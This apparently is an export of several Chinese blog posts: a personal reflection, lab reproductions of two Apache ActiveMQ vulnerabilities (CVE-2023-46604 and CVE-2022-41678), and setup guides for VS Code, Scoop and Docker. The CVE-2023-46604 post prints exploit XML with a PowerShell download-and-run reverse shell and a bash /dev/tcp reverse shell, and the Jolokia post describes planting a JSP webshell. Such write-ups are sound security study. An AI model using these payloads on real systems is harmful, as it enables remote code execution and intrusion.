[{"content":" 人的眼里不是你 你眼里的自己也不是你 你眼中的别人才是你 ——— 如莱大boss\n回想之前的种种，我一直停留在“没准备好，光想不做”的阶段，虽然我很好地隐藏并克制了通过别人嘴里了解自己，但还是出现了自我矛盾与精神内耗，那些清醒与沉溺的对抗，让我的脑子开始不停地空转。\n恰好那是一段独处的时间，我开始阅读，复盘生活中发生的事，琢磨里面的弯弯绕绕。一开始只是打发时间，想让脑子有个主题而不是瞎转，慢慢地，我喜欢上了这种第三方视角的感觉。\n这种怪异的抽离感得以让我短暂摆脱内耗，但始终是治标不治本。\n由于思想认知的不足，我没有方向，不知道怎么提升。我告诉自己要“知行合一”，心境却始终差那么一点意思。\n在此之前，我不知道“内观”是什么，也不知道“内观”究竟意味着什么。\n内观，或者说自我反省，是一种深度审视自己内心的方式。它帮助我们剥离表象，直面内心深处的恐惧和不足。这个过程虽痛苦，但却是成长和自我提升的重要途径。\n今天遇见这段话，给我一种点醒梦中人的宿命感。反复咀嚼这句话，我明白了，那些混沌感好像是在建立内观。就像剥洋葱一样，一层一层地剥开内心不敢直视的黑暗，不停地撕开自己的面具和遮羞布。原来这就是内观的过程，消除恐惧，承认不足，破而后立。\n所以内耗，说到底，不是外界的东西在伤害你，而是你自己在伤害自己。通过内观进行主体性的建立，消除客体化，就能走出精神内耗。\n通过投射效应，可以明白事实和看法是两码事，决定人心理状态的不是事实本身，而是对事实的看法。\n一个很老的例子，桌上半瓶水是个事实，但同一个事实会产生悲观和乐观两种人，这就是由人们的看法决定的。\n任何一件事永远可以从乐观的积极的方面去看待，这就叫成长型思维。建立主体性，用成长型思维看待生活，才会一路开挂下去。\n附录 参考文献 《写的内容越来越长了，素材都无关紧要的拼着看吧#画室日常 #油画 #内耗 - 抖音 (douyin.com)》\n版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-11T18:30:21+08:00","image":"http://ranch007.github.io/p/%E6%9C%89%E7%A7%8D%E4%B8%80%E8%AF%AD%E6%83%8A%E9%86%92%E6%A2%A6%E4%B8%AD%E4%BA%BA%E7%9A%84%E5%AE%BF%E5%91%BD%E6%84%9F/boss3332_hu18266413526380578093.png","permalink":"http://ranch007.github.io/p/%E6%9C%89%E7%A7%8D%E4%B8%80%E8%AF%AD%E6%83%8A%E9%86%92%E6%A2%A6%E4%B8%AD%E4%BA%BA%E7%9A%84%E5%AE%BF%E5%91%BD%E6%84%9F/","title":"有种一语惊醒梦中人的宿命感"},{"content":" Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。\nOpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。\n影响范围 Apache ActiveMQ ≤ 5.18.2 Apache ActiveMQ ＜5.17.6 Apache ActiveMQ ＜5.16.7 Apache ActiveMQ ＜5.15.16 环境构建 ActiveMQ运行后，默认监听如下两个端口：\n默认端口 默认条件 8161 web 需配置才可远程访问 61616 tcp 远程访问 反序列化漏洞出现在61616端口中。 执行如下命令启动一个ActiveMQ 5.17.3版本服务器：\n1 docker compose up -d 在利用之前请访问http://your-ip:8161以确认服务已成功启动，后续只需要使用端口 61616。\n原理分析 分析来自于《Apache ActiveMQ CVE-2023-46604 RCE 分析——Boogipop》\n这边的diff可以看到，漏洞点在BaseDataStreamMarshaller的createThrowable方法。\nActiveMQ Classic 代理附带了一些 Spring 依赖项，包括org.springframework.context.support.ClassPathXmlApplicationContext用于运行 Spring 应用程序的依赖项。此类不仅存在于代理中，而且还是极为常见的客户端依赖项。它有一个构造函数，该构造函数接受一个String，该构造函数可以是指向网络上的 XML 应用程序配置文件的 HTTP URL。\n此漏洞的唯一已知利用方法是ClassPathXmlApplicationContext通过 HTTP 从网络某处加载恶意 XML 应用程序配置文件。此恶意 XML 明确定义了要在存在漏洞的机器（即代理或客户端）上运行的任意代码。\n漏洞复现 首先，启动一个HTTP反连服务器，其中包含我们的【poc.xml】：\n1 python3 -m http.server 6666 然后，执行【poc.py】，传入的三个参数分别是目标服务器地址、端口，以及包含poc.xml 的反连平台URL：\n1 python poc.py rhost rport http://vps:port/poc.xml 执行完成后，进入ActiveMQ容器：\n1 docker exec cve-2023-46604-activemq-1 ls -l /tmp 可以看见命令touch /tmp/activeMQ-RCE-success 已经被成功执行。\n【POC-DNSLog】\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;ping\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;xxx.xxx.xxx.cn\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 【POC-win】\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg\u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;powershell\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\u0026#39;); Invoke-PowerShellTcp -Reverse -IPAddress x.x.x.x -Port 3333]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 【POC-linux】\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\u0026#34;\u0026gt; \u0026lt;bean id=\u0026#34;pb\u0026#34; class=\u0026#34;java.lang.ProcessBuilder\u0026#34; init-method=\u0026#34;start\u0026#34;\u0026gt; \u0026lt;constructor-arg \u0026gt; \u0026lt;list\u0026gt; \u0026lt;value\u0026gt;bash\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;-c\u0026lt;/value\u0026gt; \u0026lt;value\u0026gt;\u0026lt;![CDATA[bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1]]\u0026gt;\u0026lt;/value\u0026gt; \u0026lt;/list\u0026gt; \u0026lt;/constructor-arg\u0026gt; \u0026lt;/bean\u0026gt; \u0026lt;/beans\u0026gt; 修复建议 建议更新到最新安全版本\nApache ActiveMQ ≥ 5.18.3 Apache ActiveMQ ≥ 5.17.6 Apache ActiveMQ ≥ 5.16.7 Apache ActiveMQ ≥ 5.15.16 附录 参考文献 《Apache ActiveMQ RCE 分析》\n《Apache ActiveMQ CVE-2023-46604 RCE 分析——Boogipop》\n《Achieving a Reverse Shell Exploit for Apache ActiveMQ (CVE_2023-46604)》\n《ActiveMQ RCE （CVE-2023-46604） 漏洞利用工具》\n版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-10T19:40:36+08:00","image":"http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/activemq_hu8434215637875122635.png","permalink":"http://ranch007.github.io/p/apache-activemq-openwire-%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rcecve-2023-46604/","title":"Apache ActiveMQ OpenWire 协议反序列化 RCE（CVE 2023 46604）"},{"content":" Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。\nActiveMQ中，经过身份验证的用户默认情况下可以通过/api/jolokia/接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞。\nFlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorderMXBeanImpl\n影响范围 Apache ActiveMQ before 5.16.6 Apache ActiveMQ 5.17.0 before 5.17.4 Apache ActiveMQ 5.18.0 unaffected Apache ActiveMQ 6.0.0 unaffected 环境构建 在CVE-2022-41678目录下执行如下命令启动一个Apache ActiveMQ 5.17.3服务器：\n1 docker compose up -d 服务启动后，访问http://your-ip:8161/后输入账号密码admin和admin，即可成功登录后台。\n原理分析 漏洞入口在【 http://localhost:8161/api/jolokia/】 ，⚠️注意需要带上Origin头才可以访问\n主要问题出在FlightRecorder这个Mbean，功能是记录内存，gc，调用栈等。 漏洞用到的方法主要是以下几个：\nnewRecording：新建记录 setConfiguration：更改配置 startRecording：开始录制 stopRecording：结束录制 copyTo：导出录制文件 漏洞思路是通过setConfiguration修改配置，把一些键名改成jsp代码，记录的数据就会包含该jsp代码，录制完成后，通过copyTo导出到web目录即可\n代码位置在 jdk.management.jfr.FlightRecorderMXBeanImpl#setConfiguration\n漏洞复现 首先，访问/api/jolokia/list这个API可以查看当前服务里所有的MBeans：\n1 2 # 注意需要带上Origin头才可以访问 Origin:http://192.168.1.3 这其中有两个点可以被用来执行任意代码。\n途径一 第一个方法是使用org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean，这是由Log4j2提供的一个MBean。\n攻击者使用这个MBean中的setConfigText操作可以更改Log4j的配置，进而将日志文件写入任意目录中。\n使用【POC】脚本来复现完整的过程：\n1 pyhon poc.py -u admin -p admin http://your-ip:8161 Webshell被写入在/admin/shell.jsp文件中：\n这个方法受到ActiveMQ版本的限制，因为Log4j2是在5.17.0中才引入Apache ActiveMQ。\n途径二 第二个可利用的Mbean是jdk.management.jfr.FlightRecorderMXBean。\nFlightRecorder是在OpenJDK 11中引入的特性，被用于记录Java虚拟机的运行事件。利用这个功能，攻击者可以将事件日志写入任意文件。\n使用【POC】脚本来复现完整的过程（使用--exploit参数指定使用的方法）：\n1 python poc.py -u admin -p admin --exploit jfr http://localhost:8161 Webshell被写入在/admin/shelljfr.jsp文件中：\n修复建议 AMQ-9201 - Update Jolokia default access configuration · apache/activemq@6120169\nGitHub： https://github.com/apache/activemq/commit/6120169e5) 附录 参考文献 《Apache ActiveMQ Jolokia 远程代码执行漏洞(CVE-2022-41678)分析》 《Apache ActiveMQ历史漏洞复现合集》 版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-10T19:11:16+08:00","image":"http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/activemq_hu8434215637875122635.png","permalink":"http://ranch007.github.io/p/apache-activemq-jolokia-%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2022-41678/","title":"Apache ActiveMQ Jolokia 后台远程代码执行漏洞（CVE 2022 41678）"},{"content":" 准备工作 下载 VS Code 安装包 官方下载链接：【Visual Studio Code - Code Editing. Redefined】\n下载 Msys2 Github下载链接：【msys2-installer】\n安装软件 VSCodeUserSetup-x64.exe 双击运行VSCodeUserSetup-x64-1.94.0.exe运行安装程序 msys2-x86_64.exe 双击msys2-x86_64-20240727.exe运行安装程序 当按下完成之后，会弹出打开一个 MSYS2 终端窗口。\n在此终端中，通过输入以下命令并按回车键，安装 MinGW-w64 工具链：\n1 pacman -S --needed base-devel mingw-w64-ucrt-x86_64-toolchain 出现这个界面，直接按回车键，默认接受所有的安装包。\n当系统提示是否继续安装时，请输入y并回车。\n当所有的包都安装好后，直接关闭终端。 打开安装 MSYS2 的目录，先找到ucrt64文件夹并进入，再找到bin文件夹并进入，然后在地址栏中，复制路径。 如果一开始用默认路径，那路径就是C:\\msys64\\ucrt64\\bin。\n然后在搜索框中输入 编辑系统环境变量，并打开编辑系统环境变量的设置界面。\n在系统属性的弹窗中，点击环境变量。\n在弹出的环境变量弹窗中，找到用户变量的Path，并双击打开。\n此时会弹出编辑环境变量的窗口，先点击新建按钮，然后会在空白行中出现一个输入框和一个闪烁的光标，在这里粘贴上刚刚复制的路径，最后点击确定按钮回到上层弹窗。\n最后，依次点击右下角确定退出。 最后做一下测试，按组合键Win + r之后，输入cmd回车。\n1 2 3 gcc --version g++ --version gdb --version 安装VS Code 扩展 汉化扩展包（可选） C/C++ 环境扩展包 测试 VS Code 的 C/C++ 编程环境 创建代码文件夹 VS Code 是一款基于文件夹进行代码编辑和管理的编辑器，通常我们会把新建一个文件夹来管理同一个项目的代码，并在 VS Code 中打开。\n单个 .c 文件的运行和调试 为了方便管理代码，我们先选中C文件夹，再点击新建文件夹按钮。\n此时会在C文件夹的下级出现一个输入框，我们新建一个名为test的文件夹。\n鼠标右键test文件夹，在弹出的菜单中选择新建文件。 在输入框中输入我们接下来要进行调试代码文件名，命名为test.c，注意，一定要是 .c 结尾。\n接下来就可以输入一个调试程序了，我的代码如下：\n1 2 3 4 5 6 7 8 9 #include \u0026lt;stdio.h\u0026gt; int main() { for (int i = 0; i \u0026lt; 5; i++) printf(\u0026#34;Hello Ranch~%d\\n\u0026#34;, i); return 0; } 写好测试代码后，点击右上角的调试按钮，这时会弹出调试程序的选项，选择第一个，也是本教程前面安装的 gcc 编译工具。\n如果要进行简单的断点调试，可以在行号前加一个断点，操作也很简单，只需用鼠标左键点一下行号左边的空白处即可。 如下图所示，是在第六行处加了一个断点。\n这时再去运行程序，搜索框下面就会出现调试的面板，面板上有六个按钮，分别是继续、逐过程、单步调试、单步跳出、重启和停止。\n[!IMPORTANT]\n以下是 VS Code 中的 C 语言代码调试面板功能的解释：\n继续（Continue）：继续执行程序，直到遇到下一个断点或程序结束。\n逐过程（Step Over）：逐行执行当前行，如果当前行是函数调用，则进入该函数并执行完毕。\n单步调试（Step Into）：逐行执行当前行，如果当前行是函数调用，则进入该函数并停在函数内的第一行。\n单步跳出（Step Out）：执行完当前函数的剩余部分，并停在当前函数被调用的下一行。\n重启（Restart）：重新启动程序的调试会话，即从程序的起点开始执行。\n停止（Stop）：停止程序的调试会话，结束调试过程并关闭程序执行。\n多个 .c 文件的运行与测试 如果想要进行多个 .c 文件编译后的调试，就需要进行一些配置修改。如果进行过一次编译运行，我们会发现在资源管理器的C文件夹下，多出一个.vscode的文件夹，这个文件夹里面有个tasks.json的文件\n这个文件是用于定义任务配置，这些任务可以在 VS Code 中运行，例如编译代码、运行测试、启动调试器等。\ntasks.json文件是一个 JSON 格式的文件，其中包含了任务的配置信息，包括任务名称、命令、参数等。通过编辑tasks.json文件，我们可以自定义项目中的各种任务，并在 VS Code 中方便地执行这些任务。\n当前的 VS Code 的运行效果还不是很理想，双击打开tasks.json文件修改一下编译运行功能。下图是对该 JSON 文件做了部分解释。\n具体修改如下图所示，我注释掉了原来的${file}，并新增一行*.c，表示并非指定某一个 .c 文件，而是当前文件夹下所有的.c文件。\n同时也把${fileDirname}\\\\${fileBasenameNoExtension}.exe注释掉，改成${fileDirname}\\\\program.exe，那么多个 .c 文件编译之后的可执行文件就是program.exe。\n然后点击左侧的运行与调试，再点击创建launch.json文件。\n然后 VS Code 会新建一个 JSON 文件，点击右下角的添加配置，在弹出的下拉菜单中选择C/C++：（gdb）启动。\n修改为下图红框所示内容，“program”后的内容就是前面提到的tasks.json文件中的编译后产生的可执行文件。\u0026quot;miDebuggerPath\u0026quot;后面的则是前面安装的 MinGW-W64 的 gdb 工具的路径。修改后保持关闭。\n附录 参考文献 《VS Code 配置 C/C++ 编程运行环境（保姆级教程）》\n版权信息 本文原载于 Ranch\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-09T20:27:17+08:00","image":"http://ranch007.github.io/p/vs-code-%E9%85%8D%E7%BD%AE-c-c-%E7%BC%96%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/c\u0026c++_hu17170354815735081465.png","permalink":"http://ranch007.github.io/p/vs-code-%E9%85%8D%E7%BD%AE-c-c-%E7%BC%96%E7%A8%8B%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83/","title":"VS Code 配置 C \u0026 C++ 编程运行环境"},{"content":" 转载自《Windows 下包管理器 Scoop 的安装与使用 - Muxiner\u0026rsquo;s Blog》\n🍉 什么是 Scoop ？ 😶‍🌫️ 可以去看【Scoop Github 上的介绍】。\n😶‍🌫️ 还有官方文档【Scoop Wiki】w\n😶‍🌫️ 官网【https://scoop.sh/】\nScoop 是 Windows 上的命令行安装工具。\n🙈 可以用来干嘛？\n🦥 通过命令行界面，Scoop 可以顺畅地安装应用程序。（官方说明）\n🌲 没有权限弹出窗口 🌲 隐藏 GUI 向导式安装程序 🌲 防止因而安装大量程序造成 PATH 污染 🌲 避免安装和卸载程序的不当使用 🌲 自动查找并安装依赖项 🌲 自动执行所有额外的设置步骤来获取工作程序 🍉 安装 Scoop 🍊 准备工作 PowerShell ： 确保已安装 PowerShell 5.0 或更高版本。\nWindows 10 以及更高的版本默认安装的 PowerShell 5.0。\n确保以允许 Powershell 执行本地脚本。\n1 set-executionpolicy remotesigned -scope currentuser Unrestricted 也可以，但是安全性较低。\n最好使用 RemoteSigned。\n🍑 安装在默认位置 默认安装在 C:\\Users\\username\\scoop 路径下。\n执行命令：\n1 Invoke-Expression (New-Object System.Net.WebClient).DownloadString(\u0026#39;https://get.scoop.sh\u0026#39;) 或是执行（更短的）：\n1 iwr -useb get.scoop.sh | iex 2022.11.17 更新：\n为加快 Scoop 的安装速度，主要是下载速度，使用代理进行加速下载。\nfastgit 下载\n进入用户主目录：cd ~\n下载 scoop_install.ps1：\n1 curl -o scoop_install.ps1 https://raw.fastgit.org/scoopinstaller/install/master/install.ps1 修改 scoop_install.ps1 中文件下载地址：\n1 (Get-Content scoop_install.ps1).replace(\u0026#39;https://github.com/ScoopInstaller/\u0026#39;, \u0026#39;https://download.fastgit.org//ScoopInstaller/\u0026#39;) | Set-Content scoop_install.ps1 安装 Scoop：./scoop_install.ps1\n删除 scoop_install.ps1：rm scoop_install.ps1\ngithub proxy 下载\n进入用户主目录：cd ~\n下载 scoop_install.ps1：\n1 curl -o scoop_install.ps1 https://ghproxy.com/https://raw.githubusercontent.com/scoopinstaller/install/master/install.ps1 修改 scoop_install.ps1 中文件下载地址：\n1 (Get-Content scoop_install.ps1).replace(\u0026#39;https://github.com/ScoopInstaller/\u0026#39;, \u0026#39;https://ghproxy.com/https://github.com/ScoopInstaller/\u0026#39;) | Set-Content scoop_install.ps1 安装 Scoop：./scoop_install.ps1\n删除 scoop_install.ps1：rm scoop_install.ps1\n🍑 自定义安装目录\n例如将 Scoop 安装在 C:\\Scoop 路径下。\n需要添加该路径到用户变量中：\n1 $env:SCOOP=\u0026#39;C:\\scoop\u0026#39; 1 [environment]::setEnvironmentVariable(\u0026#39;SCOOP\u0026#39;,$env:SCOOP,\u0026#39;User\u0026#39;) 当然也可以添加到系统变量中：\n不过此时需要以管理员身份运行 PowerShell ，或是以管理员身份运行 Windows Terminal，再打开 PowerShell ，否则会报错：\n1 [environment]::setEnvironmentVariable(\u0026#39;SCOOP\u0026#39;,$env:SCOOP,\u0026#39;Machine\u0026#39;) 添加完环境变量后需要重启 PowerShell 或 Terminal 等待变量生效。\n然后再执行安装指令：\n1 iwr -useb get.scoop.sh | iex 安装方式同上，点此跳转到新的安装方式\n🍑 自定义全局应用安装目录 例如自定义将全局应用安装在 C:\\apps 路径下：\n就需要将该目录添加到系统变量中，步骤同上文相同：\n😶‍🌫️ 以管理员身份运行 😶‍🌫️ $env:SCOOP_GLOBAL='C:\\apps' 😶‍🌫️ [environment]::setEnvironmentVariable('SCOOP_GLOBAL',$env:SCOOP_GLOBAL,'Machine') 😶‍🌫️ 安装指令：scoop install -g \u0026lt;app\u0026gt; 合起来就是：\n1 2 3 $env:SCOOP_GLOBAL=\u0026#39;C:\\apps\u0026#39; [environment]::setEnvironmentVariable(\u0026#39;SCOOP_GLOBAL\u0026#39;,$env:SCOOP_GLOBAL,\u0026#39;Machine\u0026#39;) scoop install -g \u0026lt;app\u0026gt; 🍉 使用 Scoop 查看 scoop 的命令：\n1 scoop help 查看命令的详细信息：\n1 2 3 scoop help \u0026lt;command\u0026gt; # for example: scoop help install # For more detailed information on INSTALL 执行 scoop help install ：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Usage: scoop install \u0026lt;app\u0026gt; [options] e.g. The usual way to install an app (uses your local \u0026#39;buckets\u0026#39;): scoop install git To install an app from a manifest at a URL: scoop install https://raw.githubusercontent.com/ScoopInstaller/Main/master/bucket/runat.json To install an app from a manifest on your computer scoop install \\path\\to\\app.json Options: -g, --global Install the app globally -i, --independent Don\u0026#39;t install dependencies automatically -k, --no-cache Don\u0026#39;t use the download cache -u, --no-update-scoop Don\u0026#39;t update Scoop before installing if it\u0026#39;s outdated -s, --skip Skip hash validation (use with caution!) -a, --arch \u0026lt;32bit|64bit\u0026gt; Use the specified architecture, if the app supports it 🍒 安装应用 分为两种情况：\n😃为当前用户安装 安装路径：scoop\\apps\nscoop 路径默认在 C:\\User\\username 。\n若是自定义安装路径，例如上文的位置，则在 C:\\Scoop\n安装命令：\n1 2 3 scoop install \u0026lt;app\u0026gt; # for example: # scoop install nano 😃为所有用户安装 默认的安装路径：C:\\ProgramData\\scoop\n若是如上文所示，自定义了全局应用安装目录，则安装路径：C:\\apps\n需要以管理员身份运行。\n安装命令：\n1 2 3 scoop install \u0026lt;app\u0026gt; -g # for example: # scoop install nano -g 🍒 卸载应用 😃卸载某一程序 1 scoop uninstall \u0026lt;app\u0026gt; 😃卸载程序并移除配置文件 1 scoop uninstall \u0026lt;app\u0026gt; -p 😃卸载全局程序\n1 scoop uninstall \u0026lt;app\u0026gt; -g 😃更多信息\n1 scoop help uninstall 🍒 更新 😃更新 scoop 及所有 bucket 但不更新 app 1 scoop update 😃更新某一 app 1 scoop update \u0026lt;app\u0026gt; 😃更新 scoop、bucket、app 1 scoop update * 😃更新全局 app 1 scoop update \u0026lt;app\u0026gt; -g 😃更多信息 1 scoop help update 🍒 其他有用操作 😃查看已安装 app 1 scoop list 😃查看可更新 app 1 scoop status 😃查看某 app 主页 1 scoop home \u0026lt;app\u0026gt; 😃查看「已知库」 1 scoop bucket known 😃添加「已知库」 1 scoop bucket add \u0026lt;bucket\u0026gt; 😃查看已添加的库 1 scoop bucket list 😃删除已添加的库 1 scoop bucket rm \u0026lt;bucket\u0026gt; 😃添加第三方库 1 scoop bucket add \u0026lt;bucket\u0026gt; \u0026lt;bucket_url\u0026gt; 😃删除已安装软件的旧版本 1 scoop cleanup * 😃清理软件缓存 通常是下载的软件安装包。\n以下命令清除所有缓存，即清空 Scoop 目录下的 cache 文件夹。\n1 scoop cache rm * 🍉 进阶 更多信息请查看【官方文档】。\n附录 参考文献 转载自《Windows 下包管理器 Scoop 的安装与使用 - Muxiner\u0026rsquo;s Blog》\n版权信息 本文原载于 Muxiner\u0026rsquo;s Blog，遵循 CC BY-NC-SA 4.0 协议，复制请保留原文出处。\n","date":"2024-11-09T20:12:54+08:00","image":"http://ranch007.github.io/p/%E8%BD%AC%E8%BD%BDwindows-%E4%B8%8B%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8-scoop-%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/scoop_hu16592925861197910045.png","permalink":"http://ranch007.github.io/p/%E8%BD%AC%E8%BD%BDwindows-%E4%B8%8B%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8-scoop-%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","title":"【转载】Windows 下包管理器 Scoop 的安装与使用"},{"content":" 前言 什么是 Docker ？ 容器工作的原理 容器的架构 Docker包括三个基本概念：\n镜像（Image）：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。 容器（Container）：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。 仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。 Docker 的优势 为何使用 Docker ？ Docker 支持开发人员使用简单的命令访问这些本机容器化功能，并通过节省工作量的应用程序编程接口 (API) 自动执行。 与 LXC 相比，Docker 提供了以下功能：\n增强的无缝容器可移植性：虽然 LXC 容器通常引用特定于机器的配置，但 Docker 容器无需修改即可在任何桌面、数据中心和云环境中运行。 更轻巧且更细粒度的更新：通过使用 LXC，可以在单个容器中组合多个进程。 这样就可以构建持续运行的应用，即使为了更新或修复而关闭某个部分也不例外。 自动化容器创建：Docker 可以基于应用源代码自动构建容器。 容器版本控制：Docker 可以跟踪容器映像的版本，回滚到先前的版本，以及跟踪版本的构建者和构建方式。 它甚至可以只上传现有版本和新版本之间的增量。 容器复用：现有容器可用作基本映像（本质上类似于用于构建新容器的模板）。 共享容器库：开发人员可以访问包含数千个用户贡献容器的开源注册表。 在初步认识了解了Docker后，下面正式进入Docker安装环节！\n安装 进入Docker官网 首先先到Docker官网下载最新官方Docker for Windows链接：【下载Docker】\n启动 Microsoft Hyper-V 在电脑上打开“控制面板”-\u0026gt;“程序”-\u0026gt; “启动或关闭Windows功能”。\n勾选Hyper-V功能\n并勾选以下功能\n重启后安装Docker 双击安装 docker\n默认配置\n等待安装结束\n安装完毕后，点击Close and log out\n电脑重启后，点击Docker程序\n现在程序就正常启动啦\n加速 配置aliyun镜像加速 如果pull操作比较慢，接下来需要配置一下镜像代理，便于更快速的拉取资源！ 登录aliyun官网：《镜像加速器》 使用 查看 1 docker --versionn 获取镜像 1 docker pull xxx 查看镜像 1 docer images 删除镜像 1 2 3 4 5 # 删除指定的镜像 docker rmi xxx.image # 清理本地的Docker镜像 docker image prune -f 启动容器 以下命令使用xxx镜像启动一个容器，参数为以命令模式进入该容器：\n1 docker run -it xxx /bin/bash 也可以：\n1 docker run -it -rm --entrypoint /bin/bash 镜像名 所以，更常用的是这种后台启动的方式:\n1 docker run -itd xxx /bin/bash 交互容器 运行容器后正常启动状态，使用如下命令： 1 2 3 4 5 6 7 8 # 先在后台启动 docker run -itd --entrypoint /bin/bash reqpython # 查看刚才run的容器名 如：test docker ps # 再进入容器内部 docker exec -it test /bin/bash 只是做测试用，测试完后，不想保留容器，使用如下命令： 1 docker run -it --rm --entrypoint /bin/bash 镜像名 删除容器 1 2 3 4 5 # 删除单个 docker rm -f \u0026lt;容器ID\u0026gt; # 批量删除 docker rm -f \u0026lt;容器ID\u0026gt;1 \u0026lt;容器ID\u0026gt;2 \u0026lt;容器ID\u0026gt;…… 查看容器 1 docker ps -a 容器的暂停与恢复 1 2 3 4 5 # 暂停容器的运行，但是容器并没有运行 docker pause \u0026lt;容器ID\u0026gt; # 恢复容器的暂停 docker unpause \u0026lt;容器ID\u0026gt; 容器的停止与重启 1 2 3 4 5 # 使用此命令会停止容器的运行,如果想不停止运行，可以使用暂停的命令。 docker stop \u0026lt;容器ID\u0026gt; # 重启容器 docker restart \u0026lt;容器ID\u0026gt; 进入容器 先查看容器的名字 1 docker ps -a 再使用如下命令进入容器 1 docker exec -it 容器的名字 /bin/bash 更新容器 查看端口情况 查看端口开发情况 1 netstat -nlpt 查看端口占用情况 1 2 3 4 5 # 查看所有 ps aux # 查看指定服务 ps aux | grep docker 查看端口映射 1 docker port \u0026lt;容器ID\u0026gt; 查看进程号（PID） 先查找容器ID 1 docker ps -a 传入\u0026lt;容器ID\u0026gt;查找PID 1 2 3 4 5 docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026lt;容器ID\u0026gt; docker container top \u0026lt;容器ID\u0026gt; ps aux | grep \u0026lt;容器ID\u0026gt; 获取容器内部正在运行的任务的占用内存资源情况 1 docker stats --no-stream \u0026lt;容器ID\u0026gt; 复制本地文件到容器内 1 